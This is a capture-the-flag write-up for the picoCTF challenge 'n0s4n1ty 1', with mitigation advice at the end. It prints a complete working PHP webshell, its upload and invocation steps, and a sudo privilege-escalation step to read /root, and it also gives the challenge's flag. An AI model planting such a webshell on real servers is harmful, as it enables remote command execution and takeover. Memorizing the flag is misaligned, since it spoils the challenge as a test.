# [n0s4n1ty 1](https://play.picoctf.org/practice/challenge/482)

## Challenge Information

- **Category**: Web Exploitation
- **Difficulty**: Medium
- **Description**: A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your ultimate goal is to find the hidden flag located in the `/root` directory.

## Solution Overview

This challenge involves exploiting an **unsanitized file upload** vulnerability that allows arbitrary files to be uploaded and executed on the server. By leveraging this weakness, we can gain a **remote shell**, escalate privileges if necessary, and retrieve the flag.

## Hints

- **File upload was not sanitized.**
- **Whenever you get a shell on a remote machine, check `sudo -l`.**

## Detailed Walkthrough

### Step 1: Locate the File Upload Functionality

1. Navigate to the provided web page.
2. Look for an **upload button** or a **form field** that accepts image files (e.g., `.jpg`, `.png`).
3. Upload a blank `.txt` file (e.g., `test.txt`) to verify that the upload function works.

### Step 2: Upload a Webshell

- Since `.php` files are not blocked, upload a **PHP webshell** such as:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

- After uploading, the server confirms:
  ```
  The file webshell.php has been uploaded Path: uploads/webshell.php
  ```
- Access it in the browser:
  ```
  http://target.com/uploads/webshell.php?cmd=whoami
  ```

### Step 3: Privilege Escalation

1. Check for **sudo permissions** inside the webshell:
   ```bash
   sudo -l
   ```
   The output reveals:
   ```
   Matching Defaults entries for www-data on challenge:
       env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   
   User www-data may run the following commands on challenge:
       (ALL) NOPASSWD: ALL
   ```
2. Since `www-data` has unrestricted sudo access, escalate privileges:
   ```bash
   sudo cat /root/flag.txt
   ```
3. Retrieve the flag:
   ```
   picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}
   ```

## Tools and Resources Used

- [`easy-simple-php-webshell.php`](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php)
## Flag

```
picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}
```

## Learning Points

- How to exploit **unsanitized file uploads**
- Techniques for **bypassing file upload restrictions**
- Gaining **remote code execution** via **webshells**

## Mitigation Strategies

- **File Type Validation**: Restrict file uploads to only specific formats (e.g., `.jpg`, `.png`) using MIME type checks and server-side verification.
- **Least Privilege Principle**: Avoid running web applications as privileged users and restrict `sudo` access.

## References

- [easy-simple-php-webshell.php](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php)